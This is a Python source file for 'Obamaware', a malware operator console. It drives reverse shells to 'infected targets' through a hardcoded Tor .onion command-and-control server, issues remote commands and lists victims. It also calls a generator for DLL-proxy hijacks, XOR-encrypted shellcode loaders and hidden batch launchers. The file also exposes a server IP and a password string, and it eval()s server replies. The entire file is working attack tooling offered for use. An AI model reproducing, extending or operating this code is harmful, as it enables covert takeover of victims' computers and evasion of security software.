import cmd
import os
import sys  
import requests
import threading
import time
import re
import shutil
import subprocess
import json

ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"

url = "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion"
body = "USER ### GET"

examples = """
------------------Request-Tor--------------------
[CMD] curl --socks5-hostname 127.0.0.1:9050 http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/
[PS1] iwr http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/ -Proxy 'socks5://127.0.0.1:9050'
End Tor: taskkill /IM tor.exe /T /F

-------------Server-158.180.49.41----------------
EARDINUSE: 
    ubuntu@Obamaware1:~/Server$ pgrep -a micropython
    39168 micropython main.py
    ubuntu@Obamaware1:~/Server$ sudo kill 39168

-----------micropython-server-status-------------
systemctl status micropython-app.service

restart: 
sudo systemctl daemon-reload
sudo systemctl restart micropython-app.service

sudo systemctl restart micropython-app.service

systemctl status micropython-app.service

journalctl -u micropython-app.service -f 

----------------Task-Management-------------------
list:
tasklist /fi "imagename eq cmd.exe"

kill:
taskkill /pid <PID>

kill all:
taskkill /im cmd.exe

what started process:
wmic process where "name='cmd.exe'" get ProcessId,CommandLine 

-----------------Unblock-Files---------------------
Unblock-File -Path "path"
Unblock-File -Path "path"

"""



class Obamaware(cmd.Cmd):
    intro = f"""   
 ▒█████   ▄▄▄▄    ▄▄▄       ███▄ ▄███▓ ▄▄▄       █     █░ ▄▄▄       ██▀███  ▓█████ 
▒██▒  ██▒▓█████▄ ▒████▄    ▓██▒▀█▀ ██▒▒████▄    ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▒██░  ██▒▒██▒ ▄██▒██  ▀█▄  ▓██    ▓██░▒██  ▀█▄  ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██   ██░▒██░█▀  ░██▄▄▄▄██ ▒██    ▒██ ░██▄▄▄▄██ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░ ████▓▒░░▓█  ▀█▓ ▓█   ▓██▒▒██▒   ░██▒ ▓█   ▓██▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░ ▒░▒░▒░ ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
  ░ ▒ ▒░ ▒░▒   ░   ▒   ▒▒ ░░  ░      ░  ▒   ▒▒ ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
░ ░ ░ ▒   ░    ░   ░   ▒   ░      ░     ░   ▒     ░   ░    ░   ▒     ░░   ░    ░   
    ░ ░   ░            ░  ░       ░         ░  ░    ░          ░  ░   ░        ░  ░
               ░                                                                   
    
\033[32mWelcome to the Obamaware shell. \033[32mType help to list commands.\033[0m\n

{ErrorSign} Use env. variables without % for generation to resolve at runtime.\n
{ErrorSign} Example: %TEMP%\ --> TEMP\ .\n"""
    prompt = 'Obamaware>'
    file = None

    def __init__(self):
        super().__init__()
        self.revshell = False
        self.revname = ""
        self.cd = False
        self.do_clear("")
        self.lastout = True
        self.inactivitycounter = 0

        self.session = requests.Session()
        self.session.trust_env = False  # optional – ignoriert System-Proxy-Variablen

        self.session.proxies.update({
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050",
        })

        self.do_cmd("start \"TOR PROXY\" cmd /c \"%LOCALAPPDATA%\\python-v.3.11.0\\.venv\\7e4560ebe40c4917a86f5190a0dca06a.cmd\"")
    
    def safe_print(self, text):
        sys.stdout.write("\r")                    # Return to start of line
        sys.stdout.write("\033[K")
        sys.stdout.write("\r")  
        if text:                  # Return to start again
            print(text+"\n")   
        else:
            print("")                            # Print the output
        sys.stdout.write(self.prompt)
                         # Reprint the prompt
        sys.stdout.flush()
    
    def insert_percent_env(self, path: str, env=None) -> str:
        if env is None:
            env = os.environ

        # Menge aller Umgebungsvariablennamen (Großschreibung für case-insensitive Vergleich)
        names = {k.upper() for k in env.keys()}

        # In Segmente und Separatoren splitten, Separatoren beibehalten
        parts = re.split(r'([\\/]+)', path)
        for i in range(0, len(parts), 2):  # 0,2,4,... sind die Token; 1,3,5,... die Separatoren
            token = parts[i]
            if not token:
                continue
            # Bereits als %VAR%? Dann unverändert lassen
            if token.startswith('%') and token.endswith('%') and len(token) > 2:
                continue
            # Wenn das Segment einem Env-Namen entspricht, als %VAR% setzen
            if token.upper() in names:
                parts[i] = f"%{token.upper()}%"
        return ''.join(parts)
    
    def do_guide(self, part=None):
        self.safe_print(examples)
    
    def send_request_loop(self, name, stopped):
        while not stopped.is_set():
            if not self.revshell:
                self.stop.set()
                break
            try:
                resp = self.session.post(url + "/cdr", data=body.replace("USER", name), timeout=3)
                response = resp.text.split(" ### ", 1)
                if "output" in response[0] and not self.lastout:
                    if len(response) > 1:
                        if "__NO_PAYLOAD__" != response[1]:
                            self.inactivitycounter = 0
                            if self.cd:
                                self.cd = False
                                self.prompt = f'{Status} {resp.text.split(" ### ", 1)[1].strip()}>'
                                self.safe_print("")
                            else:
                                self.safe_print(f"{Success} {resp.text.split(' ### ', 1)[1].strip()}")
                            self.lastout = True
                if resp.text == "output ###":
                    self.safe_print(f"{Success} Command executed successfully with no output.")
                    self.lastout = True
            except requests.RequestException as e:
                pass
            if self.inactivitycounter >= 5:
                self.inactivitycounter = 0
                self.do_EOF("")
                self.safe_print(f"{ErrorSign} No response from client. Reverse shell stopped.")
            elif self.lastout and "execute" in resp.text.split(" ### ", 1)[0]:
                self.inactivitycounter += 1
            time.sleep(3)

    def do_cd(self, line):
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        self.cd = True
        if args:
            self.send_request("POST", self.revname, f"cd {args}", True).strip("\r\n")
        else:
            self.send_request("POST", self.revname, "cd ", True)

    def send_request(self, mode, name, cmd=None, cd=False):
        if mode == "GET":
            try:
                resp = self.session.post(url + "/cdr", data=body.replace("USER", name), timeout=3)
                if resp:
                    self.prompt = f'Obamaware {name}>'
                else:
                    return
                if not self.revshell:
                    self.revshell = True
                    self.revname = name
                    print(f"{Status} Reverse shell started. Type 'exit' or 'EOF' to stop.")
                    print(f"{Status} Type <<EOT to beginn a multiline command and EOT to send it.")
                    print(f"{Status} Retrieving working directory...")
                    self.prompt = f'{ErrorSign} If nothing happens, the client might be offline...'
                    self.stop = threading.Event()
                    t = threading.Thread(target=self.send_request_loop, args=(name, self.stop))
                    t.start()
                self.do_cd("")  # Get initial directory
                return resp.text
            except requests.RequestException as e:
                print(f"{ErrorSign} request failed:", e)
        elif mode == "POST" and cmd:
            if cd:
                try:
                    resp = self.session.post(url + "/cdr", data=body.replace("USER", name).replace("GET", "cd ### " + cmd[3:]), timeout=10)
                    self.lastout = False
                    return resp.text
                except requests.RequestException as e:
                    print("request failed:", e)
                    return
            else:
                try:
                    resp = self.session.post(url + "/cdr", data=body.replace("USER", name).replace("GET", "execute ### " + cmd), timeout=10)
                    self.lastout = False
                    return resp.text
                except requests.RequestException as e:
                    print("request failed:", e)
                    return
        elif mode == "storage":
            try:
                resp = self.session.post(url + "/Aoukgbf92Luhdaolöi(9721klja2", "reply = self.names", timeout=3)
                resp = eval(resp.text)
                if resp:
                    for i in resp: print(i)
            except requests.RequestException as e:
                print(f"{ErrorSign} request failed:", e)
        elif mode == "auth":
            try:
                data = "BarackOvirus"
                resp = self.session.post(url + "/password", data, timeout=3)
                if resp:
                    print(resp.text)
            except requests.RequestException as e:
                print(f"{ErrorSign} request failed:", e)
    # ----- basic shell commands -----
    def multiline_command(self):
        command = ""
        line = ""
        while line.strip() != "EOT":
            line = input(">>")
            command += line + "\n"
        return command[:-4]
    
    def do_EOF(self, line):
        self.revshell = False
        if self.prompt == 'Obamaware>':
            return True
        else:
            self.prompt = 'Obamaware>'

    def do_exit(self, line):
        self.revshell = False
        if self.prompt == 'Obamaware>':
            return True
        else:
            self.prompt = 'Obamaware>'

    def do_clear(self, line):
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_proxy(self, line):
        print("")
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py ' + args)
    
    def do_loader(self, line):
        print("")
        line = "null null " + line
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py ' + args)
    
    def do_batstarter(self, line):
        print("")
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py bat_starter ' + args)

    def do_cmd(self, line):
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        os.system(line)


    def do_revshell(self, line):
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        if args == "list":
            self.send_request("storage", self.revname)
        else:
            self.send_request("GET", args)
    
    def list_shell_names(self):
        pass
    

    def do_help(self, line):
        print("\n")
        print("  \033[32mproxy\033[0m - Create a dll-proxy + optional ShellcodeLoader creation\n          \033[94m<dll_path> <exe_to_load> <cpp_script_path(output)>\n")
        print("  \033[32mloader\033[0m - Create a shellCodeLoader with XOR encrypted payload\n                    \033[94m<shellcode_path> <xor_key> <cpp_script_path(output)>\n")
        print("  \033[32mbatstarter\033[0m - Create a cpp Script to start a .bat hiddden\n               \033[94m<path to bat> [<path to bat> ...]\n")
        print("  \033[32mrevshell\033[0m - Establish a reverse shell to an infected target\n             \033[94m<name> [list - lists all available names]\n")
        print("  \033[32mclear\033[0m - Clear the console")
        print("  \033[32mexit / EOF\033[0m - Exit the shell")
        print("  \033[32mhelp\033[0m - Show this help message")
        print("  \033[32mguide\033[0m - Show usefull commands")
        print("  \033[32mcmd\033[0m \033[94m<command>\033[0m - Execute a cmd command")
    
    def default(self, line):
        args = ' '.join([self.insert_percent_env(i.strip()) for i in line.strip().split(' ') if i])
        send = True
        if self.revshell:
            if args == "EOT<<":
                args = self.multiline_command()
            elif args == "auth":
                self.send_request("auth", self.revname)
                send = False
            if send:
                self.send_request("POST", self.revname, args)
        else:
            print(f"{ErrorSign} Unknown command: {line}. Type 'help' to list commands.")

if __name__ == '__main__':
    Obamaware().cmdloop()